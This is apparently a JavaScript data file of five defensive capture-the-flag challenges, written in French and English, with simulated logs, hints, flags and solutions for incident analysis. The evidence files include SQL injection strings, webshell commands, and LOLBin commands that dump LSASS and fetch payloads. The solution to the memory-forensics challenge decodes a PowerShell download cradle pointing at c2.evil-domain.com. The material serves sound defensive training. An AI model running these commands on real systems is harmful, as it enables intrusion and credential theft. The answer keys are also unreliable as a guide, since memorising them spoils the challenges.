export const ctfs = [
  {
    id: 'ctf-001',
    title: 'L\'Intrus dans les Logs',
    titleEn: 'The Log Intruder',
    category: 'Log Analysis',
    difficulty: 'easy',
    points: 100,
    levelRequired: 0,
    description: `Un serveur web a été compromis la nuit dernière. Votre mission : analyser les logs Apache fournis et retrouver l'adresse IP de l'attaquant ainsi que la vulnérabilité exploitée.`,
    descriptionEn: `A web server was compromised last night. Your mission: analyze the provided Apache logs to find the attacker's IP address and the exploited vulnerability.`,
    objectives: [
      'Identifier l\'adresse IP de l\'attaquant',
      'Déterminer le type d\'attaque utilisé',
      'Trouver le fichier compromis',
      'Calculer la durée de l\'attaque'
    ],
    objectivesEn: [
      'Identify the attacker\'s IP address',
      'Determine the attack type used',
      'Find the compromised file',
      'Calculate the attack duration'
    ],
    files: {
      'access.log': `192.168.1.100 - - [10/Jan/2024:08:23:11 +0000] "GET /index.php HTTP/1.1" 200 4523
192.168.1.100 - - [10/Jan/2024:08:23:12 +0000] "GET /login.php HTTP/1.1" 200 1234
10.0.0.45 - - [10/Jan/2024:08:45:33 +0000] "GET /login.php?user=admin HTTP/1.1" 200 1234
10.0.0.45 - - [10/Jan/2024:08:45:34 +0000] "GET /login.php?user=admin' OR '1'='1 HTTP/1.1" 200 5678
10.0.0.45 - - [10/Jan/2024:08:45:35 +0000] "GET /login.php?user=admin' OR '1'='1'; DROP TABLE users-- HTTP/1.1" 200 5678
10.0.0.45 - - [10/Jan/2024:08:45:36 +0000] "GET /login.php?user=admin' UNION SELECT username,password FROM users-- HTTP/1.1" 200 9876
10.0.0.45 - - [10/Jan/2024:08:45:37 +0000] "GET /admin/dashboard.php HTTP/1.1" 200 15234
10.0.0.45 - - [10/Jan/2024:08:45:38 +0000] "GET /admin/users.php HTTP/1.1" 200 8765
10.0.0.45 - - [10/Jan/2024:08:46:12 +0000] "POST /admin/upload.php HTTP/1.1" 200 342
10.0.0.45 - - [10/Jan/2024:08:46:13 +0000] "GET /uploads/shell.php HTTP/1.1" 200 123
10.0.0.45 - - [10/Jan/2024:08:46:14 +0000] "GET /uploads/shell.php?cmd=id HTTP/1.1" 200 145
10.0.0.45 - - [10/Jan/2024:08:46:15 +0000] "GET /uploads/shell.php?cmd=whoami HTTP/1.1" 200 132
10.0.0.45 - - [10/Jan/2024:08:47:01 +0000] "GET /uploads/shell.php?cmd=cat+/etc/passwd HTTP/1.1" 200 2341
192.168.1.100 - - [10/Jan/2024:09:15:22 +0000] "GET /index.php HTTP/1.1" 200 4523`,
      'error.log': `[Thu Jan 10 08:45:34 2024] [error] mod_security: Access denied with code 403 (phase 2). Match of "rx (?i:(?:union.*?select|select.*?union))" against "ARGS:user" required. [hostname "webserver.local"] [uri "/login.php"]
[Thu Jan 10 08:45:35 2024] [error] PHP Warning: mysql_query() expects parameter... in /var/www/html/login.php on line 45
[Thu Jan 10 08:45:36 2024] [error] PHP Notice: Trying to get property of non-object in /var/www/html/login.php on line 67
[Thu Jan 10 08:46:12 2024] [error] PHP Warning: move_uploaded_file(): Unable to move '/tmp/phpXxXxXx' to '/var/www/html/uploads/shell.php'`
    },
    hints: [
      'Cherchez les requêtes HTTP avec des caractères spéciaux comme les apostrophes et les mots-clés SQL.',
      'L\'attaquant a utilisé une technique d\'injection SQL pour contourner l\'authentification.',
      'Après le SQL injection, cherchez une requête POST vers upload.php — c\'est l\'upload d\'un webshell.',
      'Le flag est composé de l\'IP de l\'attaquant et du fichier malveillant uploadé : FLAG{10.0.0.45_shell.php}'
    ],
    hintsEn: [
      'Look for HTTP requests with special characters like apostrophes and SQL keywords.',
      'The attacker used SQL injection to bypass authentication.',
      'After SQL injection, look for a POST request to upload.php — this is a webshell upload.',
      'The flag is composed of the attacker\'s IP and the malicious uploaded file: FLAG{10.0.0.45_shell.php}'
    ],
    flag: 'FLAG{10.0.0.45_shell.php}',
    solution: `**Solution détaillée :**

1. **Identification de l'attaquant**: L'IP 10.0.0.45 génère des requêtes suspectes à partir de 08:45:33

2. **Type d'attaque**: SQL Injection sur le paramètre \`user\` de login.php
   - Tentative 1: \`admin' OR '1'='1\` — bypass basique
   - Tentative 2: \`UNION SELECT\` — exfiltration des credentials

3. **Webshell**: Après avoir obtenu accès admin, upload d'un webshell PHP via /admin/upload.php vers /uploads/shell.php

4. **Persistance**: Exécution de commandes via le paramètre \`cmd\`

**Timeline**: Attaque de 08:45:33 à 08:47:01 (1 minute 28 secondes)`,
    xpReward: 150
  },
  {
    id: 'ctf-002',
    title: 'Trafic Suspect',
    titleEn: 'Suspicious Traffic',
    category: 'Network Analysis',
    difficulty: 'medium',
    points: 250,
    levelRequired: 1,
    description: `Notre système de détection d'intrusion a capturé du trafic réseau inhabituel. Un poste de travail semble communiquer avec l'extérieur de manière suspecte. Analysez le dump réseau et identifiez la communication C2.`,
    descriptionEn: `Our intrusion detection system captured unusual network traffic. A workstation seems to be communicating externally in a suspicious manner. Analyze the network dump and identify the C2 communication.`,
    objectives: [
      'Identifier le poste de travail compromis',
      'Trouver le serveur C2 (IP et port)',
      'Identifier le protocole de communication utilisé',
      'Extraire le flag caché dans le trafic'
    ],
    objectivesEn: [
      'Identify the compromised workstation',
      'Find the C2 server (IP and port)',
      'Identify the communication protocol used',
      'Extract the hidden flag from the traffic'
    ],
    files: {
      'network_capture.txt': `=== NETWORK CAPTURE SUMMARY ===
Capture time: 2024-01-15 14:23:00 - 14:45:00
Interface: eth0

--- DNS QUERIES ---
14:23:01 192.168.10.55 -> 8.8.8.8 [DNS] Query: updates.microsoft-cdn.com (A)
14:23:02 8.8.8.8 -> 192.168.10.55 [DNS] Response: 185.220.101.47
14:23:15 192.168.10.55 -> 8.8.8.8 [DNS] Query: analytics.google-tracking.net (A)
14:23:16 8.8.8.8 -> 192.168.10.55 [DNS] Response: 185.220.101.47
14:30:00 192.168.10.55 -> 8.8.8.8 [DNS] Query: aGVsbG8td29ybGQ.updates.microsoft-cdn.com (TXT)
14:30:01 8.8.8.8 -> 192.168.10.55 [DNS] Response: TXT "RkxBR3tmb3VuZF9jMl9kbnNfdHVubmVsfQ=="

--- HTTP/HTTPS ---
14:23:17 192.168.10.55 -> 185.220.101.47:443 [TLS] ClientHello SNI: updates.microsoft-cdn.com
14:23:18 185.220.101.47:443 -> 192.168.10.55 [TLS] ServerHello
14:23:20 192.168.10.55 -> 185.220.101.47:443 [TLS] Application Data (1024 bytes)
14:23:21 185.220.101.47:443 -> 192.168.10.55 [TLS] Application Data (512 bytes)
14:24:00 192.168.10.55 -> 185.220.101.47:443 [TLS] Application Data (2048 bytes)
14:25:00 192.168.10.55 -> 185.220.101.47:443 [TLS] Application Data (2048 bytes)
[... beacon every 60 seconds ...]
14:44:00 192.168.10.55 -> 185.220.101.47:443 [TLS] Application Data (2048 bytes)

--- OTHER CONNECTIONS ---
192.168.10.55 -> 192.168.10.1:53 [DNS] Standard queries
192.168.10.55 -> 216.58.204.46:443 [HTTPS] google.com (Normal)
192.168.10.55 -> 104.16.249.249:443 [HTTPS] cloudflare.com (Normal)

--- STATISTICS ---
192.168.10.55 -> 185.220.101.47: 21 connections, 43008 bytes sent, 10752 bytes received
Beacon interval: ~60 seconds (jitter: ±5%)`,
      'dns_queries.log': `2024-01-15 14:23:01 192.168.10.55 Query updates.microsoft-cdn.com A
2024-01-15 14:23:15 192.168.10.55 Query analytics.google-tracking.net A
2024-01-15 14:28:00 192.168.10.55 Query aGVsbG8td29ybGQ.updates.microsoft-cdn.com TXT
2024-01-15 14:29:00 192.168.10.55 Query dGhpcyBpcyBhIHRlc3Q.updates.microsoft-cdn.com TXT
2024-01-15 14:30:00 192.168.10.55 Query aGVsbG8td29ybGQ.updates.microsoft-cdn.com TXT
2024-01-15 14:30:01 RESPONSE TXT RkxBR3tmb3VuZF9jMl9kbnNfdHVubmVsfQ==`,
      'threat_intel.txt': `=== THREAT INTELLIGENCE LOOKUP ===

IP: 185.220.101.47
  - Listed in: AbuseIPDB (142 reports), Emerging Threats, Spamhaus
  - Category: TOR Exit Node / Malware C2
  - Country: Germany
  - ASN: AS205100 - F3 Netze e.V.
  - First seen: 2023-06-15
  - Last seen: 2024-01-15
  - Tags: cobalt-strike, beacon, c2

Domain: updates.microsoft-cdn.com
  - Registrar: Namecheap
  - Registered: 2024-01-10 (5 days ago!)
  - Registrant: [REDACTED via privacy service]
  - Category: SUSPICIOUS - mimicking Microsoft
  - NOT affiliated with Microsoft Corporation

Domain: analytics.google-tracking.net
  - Registrar: GoDaddy
  - Registered: 2024-01-08 (7 days ago!)
  - Category: SUSPICIOUS - mimicking Google Analytics`
    },
    hints: [
      'Commencez par identifier quelle machine interne envoie du trafic vers des IPs externes suspectes.',
      'Le domaine updates.microsoft-cdn.com a été enregistré il y a seulement 5 jours — ce n\'est pas Microsoft.',
      'Regardez les requêtes DNS de type TXT avec des sous-domaines encodés en Base64 — c\'est du DNS tunneling.',
      'Décodez la réponse TXT "RkxBR3tmb3VuZF9jMl9kbnNfdHVubmVsfQ==" depuis Base64 pour obtenir le flag.'
    ],
    hintsEn: [
      'Start by identifying which internal machine sends traffic to suspicious external IPs.',
      'The domain updates.microsoft-cdn.com was registered only 5 days ago — it\'s not Microsoft.',
      'Look at TXT DNS queries with Base64-encoded subdomains — this is DNS tunneling.',
      'Decode the TXT response "RkxBR3tmb3VuZF9jMl9kbnNfdHVubmVsfQ==" from Base64 to get the flag.'
    ],
    flag: 'FLAG{found_c2_dns_tunnel}',
    solution: `**Solution détaillée :**

1. **Poste compromis**: 192.168.10.55

2. **Serveur C2**: 185.220.101.47:443 (listé comme C2 Cobalt Strike dans le threat intel)

3. **Protocole**: DNS Tunneling + HTTPS beaconing
   - Beacon HTTPS toutes les 60 secondes (±5% jitter)
   - Exfiltration de données via requêtes DNS TXT avec sous-domaines Base64

4. **Flag caché dans DNS**:
   - Requête TXT vers: \`aGVsbG8td29ybGQ.updates.microsoft-cdn.com\`
   - Réponse: \`RkxBR3tmb3VuZF9jMl9kbnNfdHVubmVsfQ==\`
   - Décodage Base64: \`FLAG{found_c2_dns_tunnel}\`

**IOCs**:
- 185.220.101.47 (C2 server)
- updates.microsoft-cdn.com (typosquat Microsoft)
- analytics.google-tracking.net (typosquat Google)`,
    xpReward: 300
  },
  {
    id: 'ctf-003',
    title: 'L\'Alerte SIEM',
    titleEn: 'The SIEM Alert',
    category: 'SIEM Investigation',
    difficulty: 'medium',
    points: 300,
    levelRequired: 2,
    description: `Votre SIEM vient de déclencher une alerte critique : "Possible Golden Ticket Attack". Analysez les événements Windows Security et déterminez si c'est un vrai positif ou un faux positif.`,
    descriptionEn: `Your SIEM just triggered a critical alert: "Possible Golden Ticket Attack". Analyze the Windows Security events and determine if this is a true positive or false positive.`,
    objectives: [
      'Analyser les événements Kerberos dans les logs',
      'Identifier les indicateurs d\'un Golden Ticket',
      'Déterminer le compte utilisateur impliqué',
      'Classifier l\'alerte (TP/FP) et justifier'
    ],
    objectivesEn: [
      'Analyze Kerberos events in the logs',
      'Identify Golden Ticket indicators',
      'Determine the involved user account',
      'Classify the alert (TP/FP) and justify'
    ],
    files: {
      'security_events.log': `[2024-01-20 02:15:33] EventID=4769 Account Name: john.doe@CORP.LOCAL Service Name: krbtgt Ticket Options: 0x40810010 Failure Code: 0x0 Client Address: 192.168.5.100
[2024-01-20 02:15:34] EventID=4624 Account Name: john.doe Logon Type: 3 Source IP: 192.168.5.100 Workstation: WS-FINANCE-01
[2024-01-20 02:15:35] EventID=4769 Account Name: john.doe@CORP.LOCAL Service Name: cifs/DC01.corp.local Ticket Options: 0x40810010 Failure Code: 0x0 Client Address: 192.168.5.100
[2024-01-20 02:15:36] EventID=4688 Process: cmd.exe User: CORP\\john.doe PID: 4521 Parent: explorer.exe
[2024-01-20 02:15:37] EventID=4688 Process: mimikatz.exe User: CORP\\john.doe PID: 4522 Parent: cmd.exe
[2024-01-20 02:15:38] EventID=4769 Account Name: Administrator@CORP.LOCAL Service Name: cifs/DC01.corp.local Ticket Options: 0x40810010 Failure Code: 0x0 Client Address: 192.168.5.100
[2024-01-20 02:15:39] EventID=4672 Account Name: Administrator Special Privileges Assigned: SeDebugPrivilege,SeBackupPrivilege,SeRestorePrivilege,SeChangeNotifyPrivilege
[2024-01-20 02:15:40] EventID=4768 Account Name: Administrator@CORP.LOCAL Ticket Encryption Type: 0x17 (RC4-HMAC) Pre-Auth Type: 0 Client Address: 192.168.5.100
[2024-01-20 02:15:41] EventID=4625 Account Name: Administrator Source IP: 10.200.50.5 Failure Reason: Unknown user or bad password
[2024-01-20 02:15:42] EventID=5140 Share Name: \\\\DC01\\ADMIN$ Source IP: 192.168.5.100 Account: CORP\\Administrator
[2024-01-20 02:16:00] EventID=4769 Account Name: svc-backup@CORP.LOCAL Service Name: MSSQLSvc/SQL01.corp.local Ticket Options: 0x40810010 Failure Code: 0x0 Client Address: 192.168.5.100`,
      'user_context.txt': `=== USER CONTEXT ===

john.doe@CORP.LOCAL:
  - Department: Finance
  - Normal working hours: Mon-Fri 09:00-18:00
  - Usual workstation: WS-FINANCE-01 (192.168.5.100)
  - Admin rights: None
  - Last password change: 2024-01-01
  - Recent activity: Logged in Mon-Fri, normal hours

Administrator@CORP.LOCAL:
  - Type: Default built-in administrator
  - Status: DISABLED (security policy)
  - Normal usage: None (disabled account)

=== PREVIOUS 30 DAYS BASELINE ===
john.doe logon times: 08:45-18:30 (weekdays only)
john.doe typical IPs: 192.168.5.100 (WS-FINANCE-01)
Admin account: 0 logon events (account disabled)`,
      'kerberos_reference.txt': `=== KERBEROS GOLDEN TICKET INDICATORS ===

Key Event IDs:
- 4768: TGT requested (AS-REQ)
- 4769: Service ticket requested (TGS-REQ)
- 4624: Successful logon
- 4672: Special privileges assigned

Golden Ticket Red Flags:
1. TGT with very long lifetime (default Mimikatz: 10 years)
2. Account requesting tickets that are DISABLED or NON-EXISTENT
3. RC4-HMAC encryption (0x17) instead of AES (modern DCs use AES)
4. Pre-Auth Type 0 (no pre-authentication required) on TGT
5. Service tickets from disabled/non-existent accounts
6. Anomalous hours or source IPs
7. mimikatz.exe or similar tools in process logs

Ticket Options 0x40810010 = Forwardable, Renewable, Pre-authent`
    },
    hints: [
      'Regardez les EventID=4688 — quel processus inhabituel a été lancé par john.doe ?',
      'Vérifiez le statut du compte Administrator dans user_context.txt — quelque chose d\'anormal ?',
      'EventID=4768 avec Encryption Type 0x17 (RC4) et Pre-Auth Type 0 pour un compte DÉSACTIVÉ est un signe classique de Golden Ticket.',
      'Le flag est dans la classification : FLAG{true_positive_golden_ticket_mimikatz}'
    ],
    hintsEn: [
      'Look at EventID=4688 — what unusual process was launched by john.doe?',
      'Check the Administrator account status in user_context.txt — anything abnormal?',
      'EventID=4768 with Encryption Type 0x17 (RC4) and Pre-Auth Type 0 for a DISABLED account is a classic Golden Ticket sign.',
      'The flag is in the classification: FLAG{true_positive_golden_ticket_mimikatz}'
    ],
    flag: 'FLAG{true_positive_golden_ticket_mimikatz}',
    solution: `**Solution — True Positive : Golden Ticket Attack**

**Éléments de preuve :**

1. **Outil malveillant**: \`mimikatz.exe\` lancé par john.doe (EventID=4688) à 02:15:37 en pleine nuit

2. **Heure anormale**: Activité à 02:15 — john.doe ne travaille que 08:45-18:30

3. **Golden Ticket signatures**:
   - EventID=4768 pour le compte **Administrator** (compte DÉSACTIVÉ)
   - Encryption Type **0x17 (RC4-HMAC)** au lieu d'AES256
   - Pre-Auth Type **0** (pas de pré-authentification)
   - → Ticket forgé avec le hash KRBTGT

4. **Mouvement latéral**: Accès réussi à \`\\\\DC01\\ADMIN$\` avec le compte Administrator forgé

5. **Compromission probable**: john.doe a été compromis (ou est l'attaquant), a lancé mimikatz, extrait le hash KRBTGT et forgé un Golden Ticket pour se faire passer en Administrator

**Réponse recommandée**: Isoler WS-FINANCE-01, réinitialiser le compte krbtgt (DEUX fois), forcer la réinitialisation de tous les mots de passe du domaine`,
    xpReward: 400
  },
  {
    id: 'ctf-004',
    title: 'Mémoire Infectée',
    titleEn: 'Infected Memory',
    category: 'Forensics',
    difficulty: 'hard',
    points: 500,
    levelRequired: 3,
    description: `Un incident de sécurité a été détecté sur un serveur critique. L'équipe IR a capturé un dump mémoire. Analysez les résultats Volatility fournis et identifiez le processus malveillant et sa technique d'injection.`,
    descriptionEn: `A security incident was detected on a critical server. The IR team captured a memory dump. Analyze the provided Volatility results and identify the malicious process and its injection technique.`,
    objectives: [
      'Identifier le processus parent suspect',
      'Trouver le processus injecté',
      'Identifier la technique d\'injection utilisée',
      'Extraire le domaine C2 de la mémoire'
    ],
    objectivesEn: [
      'Identify the suspicious parent process',
      'Find the injected process',
      'Identify the injection technique used',
      'Extract the C2 domain from memory'
    ],
    files: {
      'volatility_pstree.txt': `Name                    Pid  PPid  Thds  Hnds Time
----------------------- ---- ----- ----- ----- -------------------
0x823c89c8:System         4     0    53   240  2024-01-25 03:00:00
. 0x8229bda0:smss.exe     368    4    3    19  2024-01-25 03:00:01
.. 0x821b8da0:csrss.exe   592  368    9   326  2024-01-25 03:00:02
.. 0x8218fda0:winlogon.exe 616  368   19   512  2024-01-25 03:00:02
... 0x820e0da0:services.exe 660 616   15   243  2024-01-25 03:00:03
.... 0x81f8fda0:svchost.exe 848  660   20   194  2024-01-25 03:00:04
.... 0x81e2fda0:svchost.exe 924  660   10   228  2024-01-25 03:00:04
.... 0x81df8da0:spoolsv.exe 1440 660    14   134  2024-01-25 03:00:05
.... 0x81dc0da0:svchost.exe 1580 660    6    88  2024-01-25 03:00:05
.... 0x81d14da0:VGAuthService 1880 660   2    60  2024-01-25 03:00:06
.... 0x81c9fda0:vmtoolsd.exe 1952 660   10   218  2024-01-25 03:00:06
.... 0x8194bda0:msdtc.exe  232  660    9   136  2024-01-25 03:00:10
... 0x81fa7da0:lsass.exe   672  616   21   381  2024-01-25 03:00:03
. 0x82198da0:explorer.exe 1712  1688  22  532  2024-01-25 08:32:11
.. 0x8216fda0:cmd.exe     2156  1712   1    23  2024-01-25 08:33:15
... 0x82155da0:powershell.exe 2344 2156  4  104  2024-01-25 08:33:17
.... 0x82140da0:svchost.exe 2580 2344  2    56  2024-01-25 08:33:45
.. 0x8213cda0:notepad.exe 2892  1712   1    52  2024-01-25 08:45:01`,
      'volatility_malfind.txt': `Process: svchost.exe Pid: 2580 Address: 0x00400000
Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE
Flags: CommitCharge: 256, PrivateMemory: 1, Protection: 6

0x00400000  4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00   MZ..............
0x00400010  b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00   ........@.......
0x00400020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................

[PE header detected in non-standard location]
[PAGE_EXECUTE_READWRITE found - suspicious!]
[Private memory not backed by file on disk]

Process: svchost.exe Pid: 2580
Disassembly at 0x00400000:
0x00400000 e8 00 00 00 00          call 0x400005
0x00400005 5b                      pop ebx
0x00400006 81 eb 05 00 40 00       sub ebx, 0x400005
0x0040000c 8b 83 xx xx xx xx       mov eax, [ebx+offset]
[... shellcode pattern ...]`,
      'volatility_cmdline.txt': `svchost.exe  2580  "C:\\Windows\\System32\\svchost.exe"
powershell.exe  2344  "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbAAtAGQAbwBtAGEAaQBuAC4AYwBvAG0ALwBwAGEAeQBsAG8AYQBkACIAKQA="
cmd.exe  2156  "cmd.exe /c whoami"`,
      'volatility_netscan.txt': `Offset(P)  Proto  Local Address    Foreign Address  State  Pid  Owner
0x81fa0178 TCPv4  0.0.0.0:445      0.0.0.0:0        LISTEN 4    System
0x81f90178 TCPv4  0.0.0.0:3389     0.0.0.0:0        LISTEN 924  svchost.exe
0x81f80340 TCPv4  192.168.1.50:49231 185.220.101.47:443 ESTABLISHED 2580 svchost.exe
0x81f70340 TCPv4  192.168.1.50:49232 185.220.101.47:443 ESTABLISHED 2580 svchost.exe`
    },
    hints: [
      'Regardez l\'arbre de processus : quel svchost.exe a un parent inhabituel (pas services.exe) ?',
      'Le PID 2580 de svchost.exe a pour parent powershell.exe (PID 2344) — ce n\'est pas normal.',
      'Décodez la commande PowerShell encodée en Base64 dans cmdline.txt pour voir ce qui a été exécuté.',
      'La commande Base64 décodée révèle le domaine C2 : c2.evil-domain.com — FLAG{process_injection_hollowing_c2_evil_domain}'
    ],
    hintsEn: [
      'Look at the process tree: which svchost.exe has an unusual parent (not services.exe)?',
      'PID 2580 svchost.exe has powershell.exe (PID 2344) as parent — this is not normal.',
      'Decode the Base64-encoded PowerShell command in cmdline.txt to see what was executed.',
      'The decoded Base64 command reveals the C2 domain: c2.evil-domain.com — FLAG{process_injection_hollowing_c2_evil_domain}'
    ],
    flag: 'FLAG{process_injection_hollowing_c2_evil_domain}',
    solution: `**Solution — Process Hollowing détecté**

**Chaîne d'infection :**
\`\`\`
explorer.exe (1712)
  └─ cmd.exe (2156) — "cmd.exe /c whoami"
       └─ powershell.exe (2344) — commande encodée Base64 suspecte
            └─ svchost.exe (2580) — PROCESSUS HOLLOW
\`\`\`

**Décodage Base64 de la commande PowerShell :**
\`\`\`
IEX (New-Object Net.WebClient).DownloadString("http://c2.evil-domain.com/payload")
\`\`\`
→ Téléchargement et exécution en mémoire d'un payload depuis le C2

**Technique : Process Hollowing**
- svchost.exe lancé avec parent powershell (anomalie)
- malfind détecte : en-tête PE en mémoire privée, PAGE_EXECUTE_READWRITE
- Connexion réseau active vers 185.220.101.47:443 (C2)

**IOCs :**
- c2.evil-domain.com
- 185.220.101.47:443
- powershell.exe -Enc [base64]`,
    xpReward: 600
  },
  {
    id: 'ctf-005',
    title: 'Threat Hunt : APT',
    titleEn: 'Threat Hunt: APT',
    category: 'Threat Hunting',
    difficulty: 'expert',
    points: 1000,
    levelRequired: 4,
    description: `Renseignement reçu : un groupe APT aurait ciblé votre organisation. Aucune alerte SIEM n'a été déclenchée. Effectuez une chasse aux menaces proactive sur les données fournies et retrouvez les TTPs utilisés.`,
    descriptionEn: `Intelligence received: an APT group may have targeted your organization. No SIEM alerts triggered. Perform a proactive threat hunt on the provided data and find the TTPs used.`,
    objectives: [
      'Identifier la technique de persistance utilisée',
      'Trouver les LOLBins utilisés pour l\'évasion',
      'Identifier le compte compromis initialement',
      'Mapper les TTPs sur le framework MITRE ATT&CK',
      'Trouver le flag caché dans les données'
    ],
    objectivesEn: [
      'Identify the persistence technique used',
      'Find the LOLBins used for evasion',
      'Identify the initially compromised account',
      'Map the TTPs to the MITRE ATT&CK framework',
      'Find the hidden flag in the data'
    ],
    files: {
      'endpoint_telemetry.log': `2024-02-01 09:15:23 PROC word.exe PID=3412 Parent=outlook.exe User=sarah.martin Args="/q /n C:\\Users\\sarah.martin\\AppData\\Local\\Temp\\invoice_2024.docm"
2024-02-01 09:15:25 PROC wscript.exe PID=3456 Parent=word.exe User=sarah.martin Args="C:\\Users\\sarah.martin\\AppData\\Local\\Temp\\~WRL0003.tmp"
2024-02-01 09:15:27 NET wscript.exe PID=3456 Dest=212.83.159.131:80 User=sarah.martin
2024-02-01 09:15:29 PROC mshta.exe PID=3501 Parent=wscript.exe User=sarah.martin Args="http://212.83.159.131/stage2.hta"
2024-02-01 09:15:35 PROC regsvr32.exe PID=3567 Parent=mshta.exe User=sarah.martin Args="/s /u /i:http://212.83.159.131/payload.sct scrobj.dll"
2024-02-01 09:15:40 REG HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate = "regsvr32.exe /s /u /i:http://212.83.159.131/payload.sct scrobj.dll"
2024-02-01 09:16:00 PROC rundll32.exe PID=3612 Parent=regsvr32.exe User=sarah.martin Args="C:\\Windows\\System32\\comsvcs.dll MiniDump 672 C:\\Users\\sarah.martin\\AppData\\Local\\Temp\\lsass.dmp full"
2024-02-01 09:16:15 FILE C:\\Users\\sarah.martin\\AppData\\Local\\Temp\\lsass.dmp Created Size=35MB User=sarah.martin
2024-02-01 09:16:30 NET regsvr32.exe PID=3567 Dest=212.83.159.131:443 Protocol=HTTPS User=sarah.martin BytesSent=35945678
2024-02-01 09:17:00 PROC certutil.exe PID=3678 Parent=regsvr32.exe User=sarah.martin Args="-urlcache -split -f http://212.83.159.131/tools.zip C:\\Windows\\Temp\\svc.zip"
2024-02-01 09:17:15 PROC expand.exe PID=3701 Parent=certutil.exe User=sarah.martin Args="C:\\Windows\\Temp\\svc.zip C:\\Windows\\Temp\\svc\\"
2024-02-01 09:17:30 PROC sc.exe PID=3721 Parent=regsvr32.exe User=sarah.martin Args="create WindowsUpdateSvc binpath= C:\\Windows\\Temp\\svc\\update.exe start= auto"
2024-02-01 09:17:35 PROC sc.exe PID=3722 Parent=regsvr32.exe User=sarah.martin Args="start WindowsUpdateSvc"
2024-02-01 09:17:40 NET update.exe PID=3745 Dest=212.83.159.131:443 Protocol=HTTPS User=SYSTEM BytesSent=1024 BytesRecv=512
[Beacon every 300 seconds as SYSTEM]
2024-02-01 09:22:40 NET update.exe PID=3745 Dest=212.83.159.131:443 SYSTEM
[...continues...]
2024-02-01 11:30:00 FILE C:\\Windows\\Temp\\svc\\update.exe Modified User=SYSTEM
2024-02-01 11:30:01 REG HKLM\\SYSTEM\\CurrentControlSet\\Services\\WindowsUpdateSvc\\Description = "RkxBR3thcHRfaHVudF9taXRyZV90dHBzX2ZvdW5kfQ=="`,
      'mitre_reference.txt': `=== MITRE ATT&CK REFERENCE ===

T1566.001 - Spearphishing Attachment
T1204.002 - User Execution: Malicious File
T1059.005 - Command and Scripting: VBScript
T1218.005 - System Binary Proxy Execution: Mshta
T1218.010 - System Binary Proxy Execution: Regsvr32
T1547.001 - Boot or Logon Autostart: Registry Run Keys
T1003.001 - OS Credential Dumping: LSASS Memory
T1041     - Exfiltration Over C2 Channel
T1105     - Ingress Tool Transfer
T1543.003 - Create or Modify System Process: Windows Service
T1071.001 - Application Layer Protocol: Web Protocols

LOLBins (Living Off the Land Binaries):
- mshta.exe   - executes HTA files
- regsvr32.exe - executes COM scripts (Squiblydoo)
- rundll32.exe - executes DLL functions
- certutil.exe - downloads files
- wscript.exe  - executes scripts`
    },
    hints: [
      'Suivez la chaîne de processus depuis le début : outlook.exe → word.exe → wscript.exe. Quel document malveillant a démarré tout ça ?',
      'Comptez les LOLBins utilisés : wscript, mshta, regsvr32, rundll32, certutil — c\'est une technique Living off the Land classique.',
      'La persistance est double : clé de registre Run + service Windows. Regardez les commandes sc.exe.',
      'Cherchez dans les données de registre une valeur encodée en Base64 et décodez-la pour trouver le flag.'
    ],
    hintsEn: [
      'Follow the process chain from the start: outlook.exe → word.exe → wscript.exe. What malicious document started this?',
      'Count the LOLBins used: wscript, mshta, regsvr32, rundll32, certutil — this is a classic Living off the Land technique.',
      'The persistence is dual: registry Run key + Windows service. Look at the sc.exe commands.',
      'Look in the registry data for a Base64 encoded value and decode it to find the flag.'
    ],
    flag: 'FLAG{apt_hunt_mitre_ttps_found}',
    solution: `**Solution — APT Campaign Analysis**

**Vecteur initial**: Spearphishing (T1566.001) — sarah.martin ouvre invoice_2024.docm depuis Outlook

**Chaîne d'exécution**:
1. Word macro → wscript.exe (T1059.005)
2. wscript → mshta.exe (T1218.005) — LOLBin #1
3. mshta → regsvr32.exe (T1218.010) — LOLBin #2 "Squiblydoo"
4. rundll32.exe dump LSASS (T1003.001) — LOLBin #3
5. certutil.exe télécharge tools.zip (T1105) — LOLBin #4

**Persistance** (T1547.001 + T1543.003):
- Clé Run HKCU avec regsvr32
- Service Windows "WindowsUpdateSvc" (SYSTEM)

**Exfiltration** (T1041): lsass.dmp envoyé vers 212.83.159.131:443

**Flag dans registre** (Description du service):
\`RkxBR3thcHRfaHVudF9taXRyZV90dHBzX2ZvdW5kfQ==\`
→ Base64 decode → \`FLAG{apt_hunt_mitre_ttps_found}\`

**TTPs MITRE**: T1566.001, T1204.002, T1059.005, T1218.005, T1218.010, T1547.001, T1003.001, T1041, T1105, T1543.003`,
    xpReward: 1200
  }
];
